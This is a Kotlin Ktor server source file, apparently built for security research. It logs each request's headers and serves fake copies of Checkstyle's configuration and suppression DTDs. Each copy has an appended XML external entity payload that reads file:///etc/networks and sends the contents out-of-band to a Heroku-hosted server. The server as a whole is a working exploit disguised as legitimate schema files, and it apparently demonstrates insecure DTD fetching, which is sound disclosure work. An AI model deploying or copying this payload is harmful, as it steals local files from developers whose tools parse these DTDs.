/*
 * This Kotlin source file was generated by the Gradle 'init' task.
 */
package org.jlleitschuh.testing.server

import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.parameters.options.default
import com.github.ajalt.clikt.parameters.options.option
import com.github.ajalt.clikt.parameters.types.int
import io.ktor.application.ApplicationCall
import io.ktor.application.ApplicationCallPipeline
import io.ktor.application.application
import io.ktor.application.call
import io.ktor.application.install
import io.ktor.application.log
import io.ktor.features.CallId
import io.ktor.features.CallLogging
import io.ktor.features.Compression
import io.ktor.features.DefaultHeaders
import io.ktor.features.callId
import io.ktor.features.origin
import io.ktor.http.*
import io.ktor.http.content.TextContent
import io.ktor.request.header
import io.ktor.response.respond
import io.ktor.routing.get
import io.ktor.routing.routing
import io.ktor.server.engine.embeddedServer
import io.ktor.server.netty.Netty
import io.ktor.util.pipeline.PipelineContext
import org.slf4j.event.Level
import java.net.URI
import java.util.*

class App {
    val greeting: String
        get() {
            return "Hello world."
        }
}

data class OriginInfo(
    override val host: String,
    override val method: HttpMethod,
    override val port: Int,
    override val remoteHost: String,
    override val scheme: String,
    override val uri: String,
    override val version: String
) : RequestConnectionPoint {

    constructor(requestConnectionPoint: RequestConnectionPoint) :
        this(
            host = requestConnectionPoint.host,
            method = requestConnectionPoint.method,
            port = requestConnectionPoint.port,
            remoteHost = requestConnectionPoint.remoteHost,
            scheme = requestConnectionPoint.scheme,
            uri = requestConnectionPoint.uri,
            version = requestConnectionPoint.version
        )
}

fun ApplicationCall.referer() = request.header(HttpHeaders.Referrer)?.let { URI.create(it) }

/**
 * Obtains the [refererHost] from the [HttpHeaders.Referrer] header, to check it to prevent CSRF attacks
 * from other domains.
 */
fun ApplicationCall.refererHost() = referer()?.host

val maliciousDtd = """

<!ENTITY % payload SYSTEM "file:///etc/networks">
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://testing-kotlin-server.herokuapp.com/x=%payload;">'>
%param1;
%external;

""".trimIndent()

val configuationDtd = """
?xml version="1.0" encoding="UTF-8"?>

<!-- Add the following to any file that is to be validated against this DTD:

<!DOCTYPE module PUBLIC
    "-//Puppy Crawl//DTD Check Configuration 1.3//EN"
    "http://www.puppycrawl.com/dtds/configuration_1_3.dtd">
-->

<!ELEMENT module (module|property|metadata|message)*>
<!ATTLIST module name NMTOKEN #REQUIRED>

<!ELEMENT property EMPTY>
<!ATTLIST property
    name NMTOKEN #REQUIRED
    value CDATA #REQUIRED
    default CDATA #IMPLIED
>

<!--

   Used to store metadata in the Checkstyle configuration file. This
   information is ignored by Checkstyle. This may be useful if you want to
   store plug-in specific information.

   To avoid name clashes between different tools/plug-ins you are *strongly*
   encouraged to prefix all names with your domain name. For example, use the
   name "com.mycompany.parameter" instead of "parameter".

   The prefix "com.puppycrawl." is reserved for Checkstyle.

-->

<!ELEMENT metadata EMPTY>
<!ATTLIST metadata
     name NMTOKEN #REQUIRED
     value CDATA #REQUIRED
>

<!--
   Can be used to replaced some generic Checkstyle messages with a custom
   messages.

   The 'key' attribute specifies for which actual Checkstyle message the
   replacing should occur, look into Checkstyles message.properties for
   the according message keys.

   The 'value' attribute defines the custom message patterns including
   message parameter placeholders as defined in the original Checkstyle
   messages (again see message.properties for reference).
-->
<!ELEMENT message EMPTY>
<!ATTLIST message
     key NMTOKEN #REQUIRED
     value CDATA #REQUIRED
>

$maliciousDtd
""".trimIndent()

val suppressionDtd = """
<!-- Add the following to any file that is to be validated against this DTD:

<!DOCTYPE suppressions PUBLIC
    "-//Checkstyle//DTD SuppressionFilter Configuration 1.2//EN"
    "https://checkstyle.org/dtds/suppressions_1_2.dtd">
-->

<!ELEMENT suppressions (suppress*)>

<!ELEMENT suppress EMPTY>
<!ATTLIST suppress files CDATA #IMPLIED
                   checks CDATA #IMPLIED
                   message CDATA #IMPLIED
                   id CDATA #IMPLIED
                   lines CDATA #IMPLIED
                   columns CDATA #IMPLIED>

$maliciousDtd
""".trimIndent()

private fun PipelineContext<Unit, ApplicationCall>.logRequestInfo() {
    application.run {
        val loggedInfo = buildString {
            append("Call ID: ${call.callId}").append('\n')
            append("\tOrigin: ${OriginInfo(call.request.origin)}").append('\n')
            append("\tReferer: ${call.referer()}").append('\n')
            append("\tHeaders:").append('\n')
            call.request.headers.forEach { key, values ->
                append("\t\t$key: ${values.joinToString()}").append('\n')
            }
        }
        log.info(loggedInfo)
    }
}

private fun run(port: Int) {
    println("Launching on port `$port`")
    val server = embeddedServer(Netty, port) {
        install(DefaultHeaders)
        install(Compression)
        install(CallLogging) {
            level = Level.INFO
        }
        install(CallId) {
            retrieveFromHeader("X-Request-ID")
            retrieve { UUID.randomUUID().toString() }
        }
        intercept(ApplicationCallPipeline.Call) {
            logRequestInfo()
        }
        intercept(ApplicationCallPipeline.Fallback) {
            logRequestInfo()
        }
        routing {
            get("/*") {
                call.respond(HttpStatusCode.OK)
            }
            get("") {
                call.respond(HttpStatusCode.OK)
            }
            get("dtds/configuration_1_3.dtd") {
                call.respond(HttpStatusCode.OK, TextContent(
                    configuationDtd,
                    contentType = ContentType.Application.Xml_Dtd
                ))
            }
            get("/dtds/suppressions_1_2.dtd") {
                call.respond(HttpStatusCode.OK, TextContent(
                    suppressionDtd,
                    contentType = ContentType.Application.Xml_Dtd
                ))
            }
        }
    }
    server.start()
}

/**
 * Launches the application and handles the args passed to [main].
 */
class Launcher : CliktCommand(
    name = "ktor-testing"
) {
    companion object {
        private const val defaultPort = 8080
    }

    private val port: Int by option(
        "-p",
        "--port",
        help = "The port that this server should be started on. Defaults to $defaultPort."
    )
        .int()
        .default(defaultPort)

    override fun run() {
        run(port)
    }
}

fun main(args: Array<String>) = Launcher().main(args)
